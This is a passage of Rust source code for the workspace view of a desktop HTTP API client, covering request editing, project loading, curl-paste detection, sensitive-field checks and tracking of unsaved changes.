use crate::command_palette::CommandPaletteView;
use crate::explorer::{ExplorerCacheKey, ExplorerRow};
use crate::import_view::CurlImportConfirmView;
use crate::kv_editor::KvTable;
use crate::persistence::{OneshotReceiver, PersistenceWorker};
use crate::request_editor::{AuthKind, BodyKind, KvTableKind};
use crate::response_view::{ResponseCache, ResponseCacheEntry, ResponsePosition, UiSettings};
use crate::theme::{count_pill, svg_icon};
use crate::variables_sheet::{VariablesSheetView, VariablesSubmission};
use crate::{
    CloseActiveTab, FocusSearch, FocusUrl, NewRequest, OpenCommandPalette, OpenImport,
    OpenVariables, SaveRequest, SendRequest, ToggleTheme,
};
use anyhow::{Context as _, Result};
use fastman_core::{
    ApiRequest, Auth, Folder, HttpBody, HttpEngine, Project, ProjectStore, Workspace, curl,
    secrets::{MemorySecretStore, OsSecretStore, ResolvedVariables, SecretStore},
    security::{
        SensitiveFieldFinding, collect_sensitive_request_findings, sanitize_request_credentials,
    },
};
use gpui_kit::component::{
    ActiveTheme as _, IndexPath, Sizable as _, Theme, ThemeMode, WindowExt as _,
    button::{Button, ButtonVariant, ButtonVariants as _},
    dialog::{DialogButtonProps, DialogEntrance},
    input::{EditorState, InlineToken, Input, InputContent, InputEvent, InputState},
    kbd::Kbd,
    menu::{DropdownMenu as _, PopupMenuItem},
    notification::Notification,
    resizable::{h_resizable, resizable_panel, v_resizable},
    select::{SearchableVec, Select, SelectEvent, SelectItem, SelectState},
};
use gpui_kit::prelude::FluentBuilder as _;
use gpui_kit::*;
use std::{
    cell::Cell,
    collections::{HashMap, HashSet},
    rc::Rc,
    sync::Arc,
};
use tokio::{runtime::Runtime, task::AbortHandle};

pub(super) const METHODS: &[&str] = &["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"];

#[derive(Clone)]
pub(super) struct ProjectChoice {
    pub id: String,
    pub name: SharedString,
}

impl SelectItem for ProjectChoice {
    type Value = String;
    fn title(&self) -> SharedString {
        self.name.clone()
    }
    fn value(&self) -> &Self::Value {
        &self.id
    }
}

fn project_choices(projects: &[Project]) -> SearchableVec<ProjectChoice> {
    SearchableVec::new(
        projects
            .iter()
            .map(|project| ProjectChoice {
                id: project.id.clone(),
                name: project.name.clone().into(),
            })
            .collect::<Vec<_>>(),
    )
}

#[derive(Clone)]
pub(super) enum NameDialogKind {
    NewWorkspace,
    NewProject,
    RenameFolder(String),
    RenameCollection(String),
}

struct DestructiveDialogSpec {
    title: &'static str,
    ok_text: &'static str,
    message: String,
    width: Pixels,
}

/// Retained window state: project model + editor entities + request lifecycle.
pub struct WorkspaceView {
    window_handle: AnyWindowHandle,
    pub(super) focus_handle: FocusHandle,
    pub(super) workspace_store: ProjectStore,
    pub(super) workspaces: Vec<Workspace>,
    pub(super) active_workspace: usize,
    pub(super) store: ProjectStore,
    secret_store: Arc<dyn SecretStore>,
    pub(super) projects: Vec<Project>,
    pub(super) active_project: usize,
    pub(super) project_selector: Entity<SelectState<SearchableVec<ProjectChoice>>>,
    chain_mode: bool,
    pub(super) chain_editor: Option<Entity<crate::chain_sheet::ChainSheet>>,
    pub(super) explorer_search: Entity<InputState>,
    pub(super) editing_request_name: bool,
    pub(super) selected_id: Option<String>,
    pub(super) open_tabs: Vec<String>,
    pub(super) expanded: HashSet<String>,
    pub(super) explorer_epoch: u64,
    pub(super) explorer_cache:
        std::cell::RefCell<Option<(ExplorerCacheKey, Arc<Vec<ExplorerRow>>)>>,
    pub(super) target_folder: Option<String>,
    pub(super) dirty: bool,
    editor_dirty: bool,
    pub(super) suppress_dirty: bool,
    pub(super) persistence: PersistenceWorker,
    project_edit_revs: HashMap<String, u64>,
    project_persisted_revs: HashMap<String, u64>,
    in_flight_saves: HashMap<String, u64>,
    save_errors: HashMap<String, String>,
    transition_generation: u64,
    pub(super) method: String,
    pub(super) body_kind: BodyKind,
    pub(super) auth_kind: AuthKind,
    pub(super) verify_tls: bool,
    pub(super) section: usize,
    pub(super) url: Entity<InputState>,
    pub(super) request_name: Entity<InputState>,
    pub(super) params_table: KvTable,
    pub(super) headers_table: KvTable,
    pub(super) form_table: KvTable,
    pub(super) body_editor: Entity<EditorState>,
    pub(super) timeout: Entity<InputState>,
    pub(super) auth_user: Entity<InputState>,
    pub(super) auth_password: Entity<InputState>,
    pub(super) auth_token: Entity<InputState>,
    pub(super) api_key_name: Entity<InputState>,
    pub(super) api_key_value: Entity<InputState>,
    runtime: Option<Runtime>,
    engine: Option<HttpEngine>,
    run_generation: u64,
    pub(super) in_flight_request_id: Option<String>,
    pending_abort: Option<AbortHandle>,
    pending: Option<Task<()>>,
    responses: ResponseCache,
    pub(super) cached_request_count: usize,
    pub(super) params_active_count: usize,
    pub(super) headers_active_count: usize,
    pub(super) body_json_valid: bool,
    pub(super) last_url: String,
    pub(super) active_curl_confirm: Option<WeakEntity<CurlImportConfirmView>>,
    pub(super) active_command_palette: Option<WeakEntity<CommandPaletteView>>,
    pub(super) resolved_variables: ResolvedVariables,
    pub(super) template_inspection: fastman_core::template::RequestTemplateInspection,
    pub(super) draft_sensitive_findings: Vec<SensitiveFieldFinding>,
    pub(super) explorer_filter_lower: String,
    pub(super) response_tab: usize,
    pub(super) response_position: ResponsePosition,
    pub(super) response_raw: bool,
    pub(super) response_wrap: bool,
    pub(super) response_find_open: bool,
    pub(super) response_search: Entity<InputState>,
    pub(super) response_search_lower: String,
    pub(super) response_search_matches: usize,
    pub(super) explorer_scroll: UniformListScrollHandle,
    pub(super) response_scroll: UniformListScrollHandle,
    pub(super) headers_scroll: UniformListScrollHandle,
    pub(super) cookies_scroll: UniformListScrollHandle,
    pub(super) status: SharedString,
    status_is_error: bool,
    _subscriptions: Vec<Subscription>,
}

impl Drop for WorkspaceView {
    fn drop(&mut self) {
        if let Some(abort) = self.pending_abort.take() {
            abort.abort();
        }
        if let Some(runtime) = self.runtime.take() {
            runtime.shutdown_background();
        }
    }
}

impl WorkspaceView {
    pub fn new(window: &mut Window, cx: &mut Context<Self>) -> Result<Self> {
        Self::with_store_and_secrets_deferred(
            ProjectStore::system_default()?,
            Arc::new(OsSecretStore::default()),
            window,
            cx,
        )
    }

    #[cfg_attr(not(test), allow(dead_code))]
    pub(super) fn with_store(
        store: ProjectStore,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<Self> {
        Self::with_store_and_secrets(store, Arc::new(MemorySecretStore::new()), window, cx)
    }

    #[cfg(test)]
    pub(super) fn with_store_deferred(
        store: ProjectStore,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<Self> {
        Self::with_store_and_secrets_deferred(store, Arc::new(MemorySecretStore::new()), window, cx)
    }

    fn with_store_and_secrets_deferred(
        store: ProjectStore,
        secret_store: Arc<dyn SecretStore>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<Self> {
        let workspaces = vec![Workspace {
            id: "default".into(),
            name: "My workspace".into(),
        }];
        let projects = vec![Project::new("My API Project")];
        let mut view = Self::build_initial_view(
            store,
            secret_store,
            workspaces,
            projects,
            UiSettings::default(),
            "Loading workspace…",
            window,
            cx,
        );
        view.focus_handle.focus(window, cx);
        view.start_async_startup(cx);
        Ok(view)
    }

    fn with_store_and_secrets(
        store: ProjectStore,
        secret_store: Arc<dyn SecretStore>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<Self> {
        let (workspaces, mut startup_warnings) = store.workspaces_resilient()?;
        let (mut projects, proj_warnings) = store.list_resilient()?;
        startup_warnings.extend(proj_warnings);
        if projects.is_empty() {
            projects.push(store.create("My API Project")?);
        }
        let ui_settings = UiSettings::load_from_root(store.root());
        let mut view = Self::build_initial_view(
            store,
            secret_store,
            workspaces,
            projects,
            ui_settings,
            "Ready · local-first",
            window,
            cx,
        );
        view.refresh_resolved_variables();
        view.refresh_request_count();
        view.expand_initial();
        view.load_editor(window, cx);
        view.focus_handle.focus(window, cx);
        if !startup_warnings.is_empty() {
            let summary = startup_warnings.join("; ");
            view.set_status(format!("Loaded with warnings: {summary}"), true, cx);
            window.push_notification(Notification::warning(summary), cx);
        }

        Ok(view)
    }

    #[allow(clippy::too_many_arguments)]
    fn build_initial_view(
        store: ProjectStore,
        secret_store: Arc<dyn SecretStore>,
        workspaces: Vec<Workspace>,
        projects: Vec<Project>,
        ui_settings: UiSettings,
        initial_status: &'static str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Self {
        let first = projects[0].first_request_id();
        let project_selector = cx.new(|cx| {
            SelectState::new(
                project_choices(&projects),
                Some(IndexPath::default()),
                window,
                cx,
            )
        });
        let explorer_search =
            cx.new(|cx| InputState::new(window, cx).placeholder("Filter requests..."));
        let response_search =
            cx.new(|cx| InputState::new(window, cx).placeholder("Find in response..."));
        let url = cx.new(|cx| InputState::new(window, cx).placeholder("Request URL"));
        let request_name = cx.new(|cx| InputState::new(window, cx).placeholder("Request name"));
        let body_editor = cx.new(|cx| {
            EditorState::new(window, cx).placeholder("Enter JSON or raw request payload...")
        });
        let timeout = cx.new(|cx| InputState::new(window, cx));
        let auth_user = cx.new(|cx| InputState::new(window, cx).placeholder("Username"));
        let auth_password = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder("Password")
                .masked(true)
        });
        let auth_token = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder("Bearer token")
                .masked(true)
        });
        let api_key_name = cx.new(|cx| InputState::new(window, cx).placeholder("API key name"));
        let api_key_value = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder("API key value")
                .masked(true)
        });

        let mut subscriptions = Vec::new();
        subscriptions.push(cx.subscribe_in(
            &project_selector,
            window,
            |view, state, event, window, cx| {
                if matches!(event, SelectEvent::Confirm(_))
                    && let Some(id) = state.read(cx).selected_value().cloned()
                    && let Some(index) = view.projects.iter().position(|p| p.id == id)
                {
                    view.switch_project(index, window, cx);
                }
            },
        ));
        subscriptions.push(
            cx.subscribe_in(&explorer_search, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) {
                    view.explorer_filter_lower =
                        view.explorer_search.read(cx).value().trim().to_lowercase();
                    view.explorer_scroll.scroll_to_item(0, ScrollStrategy::Top);
                    cx.notify();
                }
            }),
        );
        subscriptions.push(
            cx.subscribe_in(&response_search, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) {
                    view.refresh_response_search_matches(cx);
                    cx.notify();
                }
            }),
        );
        subscriptions.push(cx.subscribe_in(
            &url,
            window,
            |view, _, event, window, cx| match event {
                InputEvent::PressEnter { .. } => view.send(Some(window), cx),
                InputEvent::Change if !view.suppress_dirty => {
                    let raw = view.url.read(cx).value().to_string();
                    let prior_url = std::mem::replace(&mut view.last_url, raw.clone());
                    let prev_started_curl = prior_url
                        .trim_start()
                        .to_ascii_lowercase()
                        .starts_with("curl");
                    if !prev_started_curl && curl::looks_like_curl_command(&raw) {
                        view.try_apply_curl_from_url_bar(&raw, prior_url, view.dirty, window, cx);
                    } else {
                        view.mark_dirty(cx);
                    }
                }
                _ => {}
            },
        ));
        subscriptions.push(
            cx.subscribe_in(
                &request_name,
                window,
                |view, _, event, window, cx| match event {
                    InputEvent::PressEnter { .. } if view.editing_request_name => {
                        view.toggle_rename_request(window, cx);
                    }
                    InputEvent::Change if !view.suppress_dirty => view.mark_dirty(cx),
                    _ => {}
                },
            ),
        );
        subscriptions.push(
            cx.subscribe_in(&body_editor, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) && !view.suppress_dirty {
                    view.refresh_body_json_valid(cx);
                    view.mark_dirty(cx);
                }
            }),
        );
        for field in [
            &timeout,
            &auth_user,
            &auth_password,
            &auth_token,
            &api_key_name,
            &api_key_value,
        ] {
            subscriptions.push(cx.subscribe_in(field, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) && !view.suppress_dirty {
                    view.mark_dirty(cx);
                }
            }));
        }

        Self {
            window_handle: window.window_handle(),
            focus_handle: cx.focus_handle(),
            workspace_store: store.clone(),
            workspaces,
            active_workspace: 0,
            store,
            secret_store,
            projects,
            active_project: 0,
            project_selector,
            explorer_search,
            editing_request_name: false,
            selected_id: first.clone(),
            open_tabs: first.into_iter().collect(),
            expanded: HashSet::new(),
            explorer_epoch: 0,
            explorer_cache: std::cell::RefCell::new(None),
            target_folder: None,
            dirty: false,
            editor_dirty: false,
            suppress_dirty: false,
            persistence: PersistenceWorker::new(),
            project_edit_revs: HashMap::new(),
            project_persisted_revs: HashMap::new(),
            in_flight_saves: HashMap::new(),
            save_errors: HashMap::new(),
            transition_generation: 0,
            method: "GET".into(),
            body_kind: BodyKind::None,
            auth_kind: AuthKind::None,
            verify_tls: true,
            section: 0,
            url,
            request_name,
            params_table: KvTable::new("param", "value", true),
            headers_table: KvTable::new("Header-Name", "value", true),
            form_table: KvTable::new("field", "value", true),
            body_editor,
            timeout,
            auth_user,
            auth_password,
            auth_token,
            api_key_name,
            api_key_value,
            runtime: None,
            engine: None,
            run_generation: 0,
            in_flight_request_id: None,
            pending_abort: None,
            pending: None,
            responses: ResponseCache::default(),
            cached_request_count: 0,
            params_active_count: 0,
            headers_active_count: 0,
            body_json_valid: true,
            last_url: String::new(),
            active_curl_confirm: None,
            active_command_palette: None,
            resolved_variables: ResolvedVariables::default(),
            template_inspection: fastman_core::template::RequestTemplateInspection::default(),
            draft_sensitive_findings: Vec::new(),
            explorer_filter_lower: String::new(),
            response_tab: 0,
            response_position: ui_settings.response_position,
            response_raw: ui_settings.response_raw,
            response_wrap: ui_settings.response_wrap,
            response_find_open: false,
            response_search,
            response_search_lower: String::new(),
            response_search_matches: 0,
            explorer_scroll: UniformListScrollHandle::new(),
            response_scroll: UniformListScrollHandle::new(),
            headers_scroll: UniformListScrollHandle::new(),
            cookies_scroll: UniformListScrollHandle::new(),
            status: SharedString::new_static(initial_status),
            status_is_error: false,
            _subscriptions: subscriptions,
            chain_mode: false,
            chain_editor: None,
        }
    }

    fn start_async_startup(&mut self, cx: &mut Context<Self>) {
        self.transition_generation = self.transition_generation.wrapping_add(1);
        let expected_gen = self.transition_generation;
        let store = self.store.clone();
        let secret_store = Arc::clone(&self.secret_store);
        let rx = self.persistence.submit_io(move || {
            let ui_settings = UiSettings::load_from_root(store.root());
            let (workspaces, mut startup_warnings) = store.workspaces_resilient()?;
            let (mut projects, proj_warnings) = store.list_resilient()?;
            startup_warnings.extend(proj_warnings);
            if projects.is_empty() {
                projects.push(store.create("My API Project")?);
            }
            let resolved_variables = projects[0].resolve_active_variables(secret_store.as_ref());
            Ok::<_, anyhow::Error>((
                ui_settings,
                workspaces,
                projects,
                resolved_variables,
                startup_warnings,
            ))
        });
        self.spawn_io_callback(rx, cx, move |view, result, mut window, cx| {
            if view.transition_generation != expected_gen {
                return;
            }
            match result {
                Ok((ui_settings, workspaces, projects, resolved_variables, startup_warnings)) => {
                    view.workspaces = workspaces;
                    view.active_workspace = 0;
                    view.projects = projects;
                    view.active_project = 0;
                    view.resolved_variables = resolved_variables;
                    view.response_position = ui_settings.response_position;
                    view.response_raw = ui_settings.response_raw;
                    view.response_wrap = ui_settings.response_wrap;
                    view.selected_id = view.current().first_request_id();
                    view.open_tabs = view.selected_id.clone().into_iter().collect();
                    view.target_folder = None;
                    if let Some(window) = window.as_deref_mut() {
                        let choices = project_choices(&view.projects);
                        view.project_selector.update(cx, |selector, cx| {
                            selector.set_items(choices, window, cx);
                            selector.set_selected_index(Some(IndexPath::default()), window, cx);
                        });
                        view.refresh_request_count();
                        view.expand_initial();
                        view.load_editor(window, cx);
                    } else {
                        view.refresh_request_count();
                        view.expand_initial();
                    }
                    if startup_warnings.is_empty() {
                        view.set_status("Ready · local-first", false, cx);
                    } else {
                        let summary = startup_warnings.join("; ");
                        view.set_status(format!("Loaded with warnings: {summary}"), true, cx);
                        Self::push_window_notification(window, Notification::warning(summary), cx);
                    }
                }
                Err(error) => {
                    let msg = format!("Failed to load workspace: {error:#}");
                    view.set_status(msg.clone(), true, cx);
                    Self::push_window_notification(window, Notification::error(msg), cx);
                }
            }
        });
    }

    pub(super) fn current(&self) -> &Project {
        &self.projects[self.active_project]
    }

    pub(super) fn current_request(&self) -> Option<&ApiRequest> {
        self.selected_id
            .as_deref()
            .and_then(|id| self.current().find_request(id))
    }

    pub(super) fn active_response_entry(&self) -> Option<&ResponseCacheEntry> {
        self.selected_id
            .as_deref()
            .and_then(|id| self.responses.get(id))
    }

    pub(super) fn current_edit_rev(&self, project_id: &str) -> u64 {
        self.project_edit_revs.get(project_id).copied().unwrap_or(0)
    }

    pub(super) fn bump_explorer_epoch(&mut self) {
        self.explorer_epoch = self.explorer_epoch.wrapping_add(1);
    }

    fn current_persisted_rev(&self, project_id: &str) -> u64 {
        self.project_persisted_revs
            .get(project_id)
            .copied()
            .unwrap_or(0)
    }

    fn bump_project_revision(&mut self, project_id: &str) -> u64 {
        let entry = self
            .project_edit_revs
            .entry(project_id.to_owned())
            .or_insert(0);
        *entry = entry.saturating_add(1);
        *entry
    }

    fn sync_dirty(&mut self) {
        let project_id = &self.current().id;
        let rev_pending =
            self.current_edit_rev(project_id) > self.current_persisted_rev(project_id);
        let in_flight = self.in_flight_saves.contains_key(project_id);
        self.dirty = self.editor_dirty || rev_pending || in_flight;
    }

    pub(super) fn mark_dirty(&mut self, cx: &mut Context<Self>) {
        self.editor_dirty = true;
        self.transition_generation = self.transition_generation.wrapping_add(1);
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.refresh_template_inspection(cx);
        cx.notify();
    }

    pub(super) fn toggle_verify_tls(&mut self, cx: &mut Context<Self>) {
        self.verify_tls = !self.verify_tls;
        self.mark_dirty(cx);
    }

    fn refresh_resolved_variables(&mut self) {
        self.resolved_variables = self
            .current()
            .resolve_active_variables(self.secret_store.as_ref());
    }

    pub(super) fn refresh_template_inspection(&mut self, cx: &mut Context<Self>) {
        if self.selected_id.is_none() {
            self.template_inspection = fastman_core::template::RequestTemplateInspection::default();
            self.draft_sensitive_findings.clear();
            return;
        }
        let draft = self.snapshot_draft_request(cx);
        self.template_inspection =
            fastman_core::template::inspect_request_with_secrets(&draft, &self.resolved_variables);
        let mut findings = Vec::new();
        collect_sensitive_request_findings(&draft, &mut findings);
        self.draft_sensitive_findings = findings;
        self.refresh_url_tokens(cx);
    }

    fn refresh_url_tokens(&mut self, cx: &mut Context<Self>) {
        let text = self.url.read(cx).value().to_string();
        let spans =
            fastman_core::template::find_resolved_spans(&text, &self.resolved_variables.values);
        let mut content = InputContent::new(text.clone());
        for span in spans {
            let raw = &text[span.range.clone()];
            let token = InlineToken::new(format!("var:{}", span.name), raw.to_owned());
            if let Ok(next) = content.clone().with_token(span.range, token) {
                content = next;
            }
        }
        self.url.update(cx, |input, cx| {
            let _ = input.set_tokens(content, cx);
        });
    }

    fn refresh_request_count(&mut self) {
        self.cached_request_count = self.current().request_count();
    }

    pub(super) fn refresh_kv_counts(&mut self, cx: &App) {
        self.params_active_count = self.params_table.active_count(cx);
        self.headers_active_count = self.headers_table.active_count(cx);
    }

    pub(super) fn refresh_body_json_valid(&mut self, cx: &App) {
        if self.body_kind != BodyKind::Json {
            self.body_json_valid = true;
            return;
        }
        let body_text = self.body_editor.read(cx).value().to_string();
        self.body_json_valid = body_text.trim().is_empty()
            || serde_json::from_str::<serde_json::Value>(&body_text).is_ok();
    }

    pub(super) fn refresh_response_search_matches(&mut self, cx: &App) {
        self.response_search_lower = self
            .response_search
            .read(cx)
            .value()
            .trim()
            .to_ascii_lowercase();
        if !self.response_find_open || self.response_search_lower.is_empty() {
            self.response_search_matches = 0;
            return;
        }
        let body = self
            .active_response_entry()
            .and_then(|entry| entry.response.as_ref())
            .map(|resp| {
                if !self.response_raw {
                    resp.pretty_body.as_ref().unwrap_or(&resp.raw_body)
                } else {
                    &resp.raw_body
                }
            });
        self.response_search_matches = body.map_or(0, |text| {
            crate::response_body_view::count_search_matches(
                text.as_ref(),
                &self.response_search_lower,
            )
        });
    }

    fn reset_response_scroll(&self) {
        self.response_scroll.scroll_to_item(0, ScrollStrategy::Top);
        self.headers_scroll.scroll_to_item(0, ScrollStrategy::Top);
        self.cookies_scroll.scroll_to_item(0, ScrollStrategy::Top);
    }

    fn kv_table_mut(&mut self, table_kind: KvTableKind) -> &mut KvTable {
        match table_kind {
            KvTableKind::Params => &mut self.params_table,
            KvTableKind::Headers => &mut self.headers_table,
            KvTableKind::Form => &mut self.form_table,
        }
    }

    pub(super) fn kv_change_handler(
        table_kind: KvTableKind,
    ) -> impl Fn(&mut Self, &mut Window, &mut Context<Self>) + Clone + 'static {
        move |view, window, cx| {
            if view.suppress_dirty {
                return;
            }
            view.kv_table_mut(table_kind).ensure_trailing_blank(
                window,
                cx,
                Self::kv_change_handler(table_kind),
            );
            view.refresh_kv_counts(cx);
            view.mark_dirty(cx);
        }
    }

    pub(super) fn add_kv_row(
        &mut self,
        table_kind: KvTableKind,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.kv_table_mut(table_kind)
            .add_row(window, cx, Self::kv_change_handler(table_kind));
        self.refresh_kv_counts(cx);
        cx.notify();
    }

    pub(super) fn remove_kv_row(
        &mut self,
        table_kind: KvTableKind,
        idx: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.kv_table_mut(table_kind).remove_row(
            idx,
            window,
            cx,
            Self::kv_change_handler(table_kind),
        );
        self.refresh_kv_counts(cx);
        self.mark_dirty(cx);
    }

    pub(super) fn append_header_preset(
        &mut self,
        key: &str,
        value: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.headers_table.append_pair(
            key,
            value,
            window,
            cx,
            Self::kv_change_handler(KvTableKind::Headers),
        );
        self.refresh_kv_counts(cx);
        self.mark_dirty(cx);
    }

    pub(super) fn extract_url_query_params(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let raw_url = self.url.read(cx).value().to_string();
        let Some((cleaned_url, pairs)) = fastman_core::security::split_url_query(&raw_url) else {
            return;
        };
        for param in pairs {
            self.params_table.append_pair(
                &param.key,
                &param.value,
                window,
                cx,
                Self::kv_change_handler(KvTableKind::Params),
            );
        }
        self.suppress_dirty = true;
        self.last_url = cleaned_url.clone();
        Self::set_input(&self.url, &cleaned_url, window, cx);
        self.suppress_dirty = false;
        self.refresh_kv_counts(cx);
        self.mark_dirty(cx);
    }

    pub(super) fn format_body_json(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let raw = self.body_editor.read(cx).value().to_string();
        if raw.trim().is_empty() {
            return;
        }
        match serde_json::from_str::<serde_json::Value>(&raw)
            .and_then(|val| serde_json::to_string_pretty(&val))
        {
            Ok(formatted) => {
                self.body_editor
                    .update(cx, |state, cx| state.set_value(formatted, window, cx));
                self.refresh_body_json_valid(cx);
                self.mark_dirty(cx);
            }
            Err(err) => {
                self.set_status(format!("JSON syntax error: {err}"), true, cx);
                window.push_notification(Notification::error(format!("Invalid JSON: {err}")), cx);
            }
        }
    }

    fn expand_initial(&mut self) {
        fn find_request_path(
            folders: &[Folder],
            target_id: &str,
            expanded: &mut HashSet<String>,
        ) -> bool {
            for folder in folders {
                if folder.requests.iter().any(|r| r.id == target_id)
                    || find_request_path(&folder.folders, target_id, expanded)
                {
                    expanded.insert(folder.id.clone());
                    return true;
                }
            }
            false
        }

        self.expanded.clear();
        let selected_id = self.selected_id.clone();
        for collection in &self.projects[self.active_project].collections {
            self.expanded.insert(collection.id.clone());
            if let Some(target_id) = selected_id.as_deref() {
                find_request_path(&collection.folders, target_id, &mut self.expanded);
            }
        }
        self.bump_explorer_epoch();
        self.explorer_scroll.scroll_to_item(0, ScrollStrategy::Top);
    }

    pub(super) fn set_input(
        state: &Entity<InputState>,
        value: impl Into<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let value = value.into();
        if state.read(cx).value().as_ref() == value {
            return;
        }
        state.update(cx, |state, cx| state.set_value(value, window, cx));
    }

    fn set_editor(
        state: &Entity<EditorState>,
        value: impl Into<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let value = value.into();
        if state.read(cx).value().as_ref() == value {
            return;
        }
        state.update(cx, |state, cx| state.set_value(value, window, cx));
    }

    pub(super) fn set_status(
        &mut self,
        message: impl Into<SharedString>,
        is_error: bool,
        cx: &mut Context<Self>,
    ) {
        self.status = message.into();
        self.status_is_error = is_error;
        cx.notify();
    }

    pub(super) fn populate_editor_from_request(
        &mut self,
        request: ApiRequest,
        preserve_existing_name: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.method = request.method;
        let current_name = self.request_name.read(cx).value().to_string();
        let keep_name = preserve_existing_name
            && !current_name.trim().is_empty()
            && current_name.trim() != "New Request";
        if !keep_name {
            Self::set_input(&self.request_name, request.name, window, cx);
        }
        self.last_url = request.url.clone();
        Self::set_input(&self.url, request.url, window, cx);
        self.params_table.load(
            &request.params,
            window,
            cx,
            Self::kv_change_handler(KvTableKind::Params),
        );
        self.headers_table.load(
            &request.headers,
            window,
            cx,
            Self::kv_change_handler(KvTableKind::Headers),
        );
        match request.body {
            HttpBody::None => {
                self.body_kind = BodyKind::None;
                Self::set_editor(&self.body_editor, "", window, cx);
                self.form_table.clear();
            }
            HttpBody::Json(text) => {
                self.body_kind = BodyKind::Json;
                Self::set_editor(&self.body_editor, text, window, cx);
                self.form_table.clear();
            }
            HttpBody::Text(text) => {
                self.body_kind = BodyKind::Text;
                Self::set_editor(&self.body_editor, text, window, cx);
                self.form_table.clear();
            }
            HttpBody::FormUrlEncoded(pairs) => {
                self.body_kind = BodyKind::FormUrlEncoded;
                Self::set_editor(&self.body_editor, "", window, cx);
                self.form_table.load(
                    &pairs,
                    window,
                    cx,
                    Self::kv_change_handler(KvTableKind::Form),
                );
            }
        };
        Self::set_input(&self.timeout, request.timeout_ms.to_string(), window, cx);
        self.verify_tls = request.verify_tls;
        self.auth_kind = AuthKind::from_auth(&request.auth);
        match request.auth {
            Auth::Basic { username, password } => {
                Self::set_input(&self.auth_user, username, window, cx);
                Self::set_input(&self.auth_password, password, window, cx);
                for field in [&self.auth_token, &self.api_key_name, &self.api_key_value] {
                    Self::set_input(field, "", window, cx);
                }
            }
            Auth::Bearer { token } => {
                Self::set_input(&self.auth_token, token, window, cx);
                for field in [
                    &self.auth_user,
                    &self.auth_password,
                    &self.api_key_name,
                    &self.api_key_value,
                ] {
                    Self::set_input(field, "", window, cx);
                }
            }
            Auth::ApiKeyHeader { name, value } | Auth::ApiKeyQuery { name, value } => {
                Self::set_input(&self.api_key_name, name, window, cx);
                Self::set_input(&self.api_key_value, value, window, cx);
                for field in [&self.auth_user, &self.auth_password, &self.auth_token] {
                    Self::set_input(field, "", window, cx);
                }
            }
            Auth::None => {
                for field in [
                    &self.auth_user,
                    &self.auth_password,
                    &self.auth_token,
                    &self.api_key_name,
                    &self.api_key_value,
                ] {
                    Self::set_input(field, "", window, cx);
                }
            }
        }
    }

    fn load_editor(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        self.active_curl_confirm = None;
        self.editing_request_name = false;
        self.suppress_dirty = true;
        let request = self.current_request().cloned();
        if let Some(request) = request {
            self.populate_editor_from_request(request, false, window, cx);
        } else {
            self.method = "GET".into();
            self.auth_kind = AuthKind::None;
            self.body_kind = BodyKind::None;
            self.verify_tls = true;
            self.last_url.clear();
            for field in [
                &self.url,
                &self.request_name,
                &self.auth_user,
                &self.auth_password,
                &self.auth_token,
                &self.api_key_name,
                &self.api_key_value,
            ] {
                Self::set_input(field, "", window, cx);
            }
            Self::set_editor(&self.body_editor, "", window, cx);
            self.params_table.load(
                &[],
                window,
                cx,
                Self::kv_change_handler(KvTableKind::Params),
            );
            self.headers_table.load(
                &[],
                window,
                cx,
                Self::kv_change_handler(KvTableKind::Headers),
            );
            self.form_table.clear();
            Self::set_input(&self.timeout, "30000", window, cx);
        }
        self.suppress_dirty = false;
        self.editor_dirty = false;
        self.sync_dirty();
        self.refresh_kv_counts(cx);
        self.refresh_body_json_valid(cx);
        self.refresh_template_inspection(cx);
        self.refresh_response_search_matches(cx);
        self.reset_response_scroll();
        cx.notify();
    }

    pub(super) fn push_window_notification(
        window: Option<&mut Window>,
        notification: Notification,
        cx: &mut App,
    ) {
        if let Some(window) = window {
            window.push_notification(notification, cx);
        }
    }

    pub(super) fn spawn_io_callback<T, F>(
        &self,
        rx: OneshotReceiver<T>,
        cx: &Context<Self>,
        on_done: F,
    ) where
        T: 'static,
        F: FnOnce(&mut Self, T, Option<&mut Window>, &mut Context<Self>) + 'static,
    {
        let window_handle = self.window_handle;
        cx.spawn(async move |this, cx| {
            let value = rx.await;
            let slot = std::rc::Rc::new(std::cell::RefCell::new(Some((value, on_done))));
            let slot_win = std::rc::Rc::clone(&slot);
            let this_win = this.clone();
            let win_res = cx.update_window(window_handle, move |_, window, cx| {
                if let Some((val, cb)) = slot_win.borrow_mut().take() {
                    let _ = this_win.update(cx, |view, cx| cb(view, val, Some(window), cx));
                }
            });
            if win_res.is_err()
                && let Some((val, cb)) = slot.borrow_mut().take()
            {
                let _ = this.update(cx, |view, cx| cb(view, val, None, cx));
            }
        })
        .detach();
    }

    fn record_in_flight_save(&mut self, project_id: &str, revision: u64) {
        self.in_flight_saves
            .entry(project_id.to_owned())
            .and_modify(|prev| *prev = (*prev).max(revision))
            .or_insert(revision);
        self.sync_dirty();
    }

    fn finish_save_tracking(
        &mut self,
        project_id: &str,
        submitted_rev: u64,
        outcome: &Result<u64, String>,
    ) -> bool {
        if let Some(&tracked) = self.in_flight_saves.get(project_id)
            && tracked <= submitted_rev
        {
            self.in_flight_saves.remove(project_id);
        }
        let has_newer_in_flight = self
            .in_flight_saves
            .get(project_id)
            .is_some_and(|&r| r > submitted_rev);

        match outcome {
